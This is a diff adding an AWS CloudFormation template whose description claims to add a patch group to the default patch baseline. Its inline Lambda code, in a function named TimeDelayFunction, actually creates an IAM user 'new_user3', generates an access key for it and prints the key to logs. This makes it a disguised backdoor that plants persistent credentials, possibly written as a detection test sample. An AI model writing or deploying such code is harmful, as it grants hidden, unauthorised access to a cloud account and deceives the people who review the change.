@@ -1,0 +1,41 @@
+AWSTemplateFormatVersion: 2010-09-09
+Description: Custom resource to add a patch group to the default patch baseline
+Resources:
+  CredCustomResource:
+    Type: 'Custom::CredCustomResource'
+    Properties:
+      ServiceToken: !GetAtt
+        - TimeDelayFunction
+        - Arn
+  TimeDelayFunction:
+    Type: 'AWS::Lambda::Function'
+    Properties:
+      Handler: index.handler
+      Role: 'arn:aws:iam::xxxxx:role/xxxxxx'
+      Code:
+        ZipFile: !Join
+          - ''
+          - - |
+              import time
+              import traceback
+              import cfnresponse
+              import boto3
+              client = boto3.client('iam')
+              def handler(event, context):
+                try:
+                  if event['RequestType'] == "Delete":
+                    cfnresponse.send(event, context, cfnresponse.SUCCESS, responseData={})
+                  elif event['RequestType'] == "Update":
+                    cfnresponse.send(event, context, cfnresponse.SUCCESS, responseData={})
+                  else:
+                    iam = boto3.client('iam')
+                    response1 = iam.create_user(UserName='new_user3')
+                    response = client.create_access_key(UserName='new_user3')
+                    print(response)
+                    cfnresponse.send(event, context, cfnresponse.SUCCESS, responseData={})
+                except Exception as e:
+                  print('Function failed due to exception.')
+                  print(e)
+                  cfnresponse.send(event, context, cfnresponse.FAILED, responseData={})
+      Runtime: python3.6
+      Timeout: '300'
